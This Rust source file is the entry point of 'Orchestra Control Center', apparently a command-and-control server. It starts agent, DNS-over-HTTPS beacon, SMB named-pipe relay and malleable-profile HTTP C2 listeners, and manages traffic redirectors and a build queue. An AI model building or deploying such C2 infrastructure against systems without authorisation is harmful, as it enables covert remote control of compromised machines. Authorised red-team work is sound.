//! Orchestra Control Center entry point.

use anyhow::Result;
use clap::{Parser, Subcommand};
use orchestra_server::{
    agent_link, api, audit::AuditLog, config::ServerConfig, doh_listener,
    http_c2::HttpC2State, malleable::{self, MultiProfileManager},
    redirector, smb_relay,
    state::AppState, tls,
};
use std::path::PathBuf;
use std::sync::Arc;

#[derive(Parser, Debug)]
#[command(
    version,
    about = "Orchestra Control Center — self-hosted management plane"
)]
struct Cli {
    /// Path to the server config TOML. If omitted, defaults are used.
    #[arg(long)]
    config: Option<PathBuf>,
    /// Override the admin bearer token (for quick local runs).
    #[arg(long)]
    admin_token: Option<String>,
    /// Override the agent shared secret.
    #[arg(long)]
    agent_secret: Option<String>,
    /// Path to a directory of malleable C2 profile TOML files.
    ///
    /// All `.toml` files in this directory are loaded as named profiles.
    /// The server hot-reloads any changed files every 30 seconds.
    #[arg(long)]
    profile_dir: Option<PathBuf>,
    /// Path to a single malleable C2 profile TOML file (backward compat).
    #[arg(long)]
    profile: Option<PathBuf>,
    /// Subcommands.
    #[command(subcommand)]
    command: Option<CliCommand>,
}

#[derive(Subcommand, Debug)]
enum CliCommand {
    /// Validate a malleable C2 profile TOML and print a report.
    ValidateProfile {
        /// Path to the profile TOML file.
        path: PathBuf,
    },
    /// Manage redirector registrations.
    Redirector {
        #[command(subcommand)]
        action: RedirectorAction,
    },
}

#[derive(Subcommand, Debug)]
enum RedirectorAction {
    /// Add a redirector to the registry.
    Add {
        /// URL of the redirector (e.g. "https://cdn-front.example.com").
        url: String,
        /// Malleable profile name this redirector serves.
        profile_name: String,
    },
    /// Remove a redirector from the registry.
    Remove {
        /// Redirector ID or URL to remove.
        identifier: String,
    },
    /// List all registered redirectors.
    List,
}

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt().init();

    // rustls 0.23 with the `ring` backend requires a process-wide default
    // CryptoProvider. Install it before any TLS code paths run.
    let _ = rustls::crypto::ring::default_provider().install_default();

    let cli = Cli::parse();

    // Handle subcommands.
    match &cli.command {
        Some(CliCommand::ValidateProfile { path }) => {
            let report = malleable::validate_profile(path);
            let json = serde_json::to_string_pretty(&report)
                .unwrap_or_else(|e| format!("{{\"error\": \"{}\"}}", e));
            println!("{}", json);
            std::process::exit(if report.valid { 0 } else { 1 });
        }
        Some(CliCommand::Redirector { action }) => {
            // CLI redirector commands need a server config for the API URL.
            let mut cfg = match cli.config.as_deref() {
                Some(p) => ServerConfig::load(p)?,
                None => ServerConfig::default(),
            };
            if let Some(t) = &cli.admin_token {
                cfg.admin_token = t.clone();
            }

            let base_url = format!("https://{}", cfg.http_addr);
            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .build()?;

            match action {
                RedirectorAction::Add { url, profile_name } => {
                    let resp = client
                        .post(format!("{}/redirector/register", base_url))
                        .header("Authorization", format!("Bearer {}", cfg.admin_token))
                        .json(&serde_json::json!({
                            "url": url,
                            "profile_name": profile_name,
                        }))
                        .send()
                        .await?;
                    if resp.status().is_success() {
                        let body: serde_json::Value = resp.json().await?;
                        println!("Redirector registered: {}", serde_json::to_string_pretty(&body)?);
                    } else {
                        let status = resp.status();
                        let text = resp.text().await.unwrap_or_default();
                        eprintln!("Error ({}): {}", status, text);
                        std::process::exit(1);
                    }
                }
                RedirectorAction::Remove { identifier } => {
                    let resp = client
                        .post(format!("{}/redirector/remove", base_url))
                        .header("Authorization", format!("Bearer {}", cfg.admin_token))
                        .json(&serde_json::json!({
                            "identifier": identifier,
                        }))
                        .send()
                        .await?;
                    if resp.status().is_success() {
                        println!("Redirector removed: {}", identifier);
                    } else {
                        let status = resp.status();
                        let text = resp.text().await.unwrap_or_default();
                        eprintln!("Error ({}): {}", status, text);
                        std::process::exit(1);
                    }
                }
                RedirectorAction::List => {
                    let resp = client
                        .get(format!("{}/redirector/list", base_url))
                        .header("Authorization", format!("Bearer {}", cfg.admin_token))
                        .send()
                        .await?;
                    if resp.status().is_success() {
                        let body: serde_json::Value = resp.json().await?;
                        println!("{}", serde_json::to_string_pretty(&body)?);
                    } else {
                        let status = resp.status();
                        let text = resp.text().await.unwrap_or_default();
                        eprintln!("Error ({}): {}", status, text);
                        std::process::exit(1);
                    }
                }
            }
            return Ok(());
        }
        None => {}
    }

    let mut cfg = match cli.config.as_deref() {
        Some(p) => ServerConfig::load(p)?,
        None => ServerConfig::default(),
    };
    if let Some(t) = cli.admin_token {
        cfg.admin_token = t;
    }
    if let Some(s) = cli.agent_secret {
        cfg.agent_shared_secret = s;
    }

    if cfg.admin_token == "change-me-admin-token"
        || cfg.agent_shared_secret == "change-me-pre-shared-secret"
    {
        eprintln!(
            "FATAL: Default credentials detected. Change admin_token and \
             pre_shared_secret in configuration before running."
        );
        std::process::exit(1);
    }

    // Resolve malleable profile manager.
    let profile_manager = if let Some(ref dir) = cli.profile_dir {
        Arc::new(MultiProfileManager::load_from_dir(dir)?)
    } else if let Some(ref file) = cli.profile {
        Arc::new(MultiProfileManager::load_from_file(file)?)
    } else {
        Arc::new(MultiProfileManager::new())
    };
    tracing::info!(
        profiles = ?profile_manager.profile_names().await,
        "loaded malleable profiles"
    );

    let hmac_key = AuditLog::derive_hmac_key(&cfg.admin_token);
    let audit = Arc::new(AuditLog::open(cfg.audit_log_path.clone(), &hmac_key)?);
    let state = Arc::new(AppState::new(
        audit.clone(),
        cfg.admin_token.clone(),
        cfg.command_timeout_secs,
        cfg.clone(),
    ));

    orchestra_server::build_handler::init_build_queue(
        cfg.max_concurrent_builds,
        cfg.builds_output_dir.clone(),
        cfg.build_retention_days,
    );

    let tls_cfg = tls::build(cfg.tls_cert_path.as_deref(), cfg.tls_key_path.as_deref()).await?;

    // Agent listener (TLS-encrypted TCP).
    {
        let state_a = state.clone();
        let secret = cfg.agent_shared_secret.clone();
        let addr = cfg.agent_addr;
        let tls_c = tls_cfg.get_inner();
        tokio::spawn(async move {
            if let Err(e) = agent_link::run(state_a, addr, secret, tls_c).await {
                tracing::error!("agent listener exited: {e}");
            }
        });
    }

    // DoH listener bridge (optional).
    if cfg.doh_enabled {
        let state_d = state.clone();
        let addr = cfg.doh_listen_addr;
        let secret = cfg.agent_shared_secret.clone();
        let domain = cfg.doh_domain.clone();
        let beacon_sentinel = cfg.doh_beacon_sentinel.clone();
        let idle_ip = cfg.doh_idle_ip.clone();
        tokio::spawn(async move {
            if let Err(e) = doh_listener::run(
                state_d,
                addr,
                secret,
                domain,
                beacon_sentinel,
                idle_ip,
            )
            .await
            {
                tracing::error!("DoH listener exited: {e}");
            }
        });
    }

    // SMB named-pipe relay (optional, Windows-only; no-op stub on other OSes).
    // Accepts named-pipe connections and bridges them to the agent TCP listener.
    if cfg.smb_relay_enabled {
        let pipe_name = cfg.smb_relay_pipe_name.clone();
        let max_instances = cfg.smb_relay_max_instances;
        let agent_addr = cfg.agent_addr;
        tokio::spawn(async move {
            if let Err(e) = smb_relay::run(&pipe_name, max_instances, agent_addr).await {
                tracing::error!("SMB relay exited: {e}");
            }
        });
    }

    // Hot-reload task for malleable profiles.
    {
        let pm = profile_manager.clone();
        pm.start_hot_reload_task();
        tracing::info!("malleable profile hot-reload task started (30s interval)");
    }

    // Redirector stale detection background task.
    {
        let state_r = state.clone();
        redirector::spawn_stale_detector(state_r);
        tracing::info!("redirector stale detector started (60s interval)");
    }

    // HTTP C2 listener (malleable profile-aware).
    if !profile_manager.profile_names().await.is_empty() {
        let http_c2_state = HttpC2State {
            profile_manager: profile_manager.clone(),
            app_state: state.clone(),
        };
        let http_c2_addr = cfg.http_c2_addr;
        let router = orchestra_server::http_c2::build_router(http_c2_state);
        tokio::spawn(async move {
            tracing::info!(addr = %http_c2_addr, "HTTP C2 listener started");
            let listener = match tokio::net::TcpListener::bind(http_c2_addr).await {
                Ok(l) => l,
                Err(e) => {
                    tracing::error!("HTTP C2 listener bind failed: {e}");
                    return;
                }
            };
            if let Err(e) = axum::serve(listener, router).await {
                tracing::error!("HTTP C2 listener exited: {e}");
            }
        });
    }

    // Operator HTTPS server.
    let app = api::router(state.clone(), cfg.static_dir.clone());
    tracing::info!(addr = %cfg.http_addr, "operator HTTPS listening");
    axum_server::bind_rustls(cfg.http_addr, tls_cfg)
        .serve(app.into_make_service())
        .await?;
    Ok(())
}
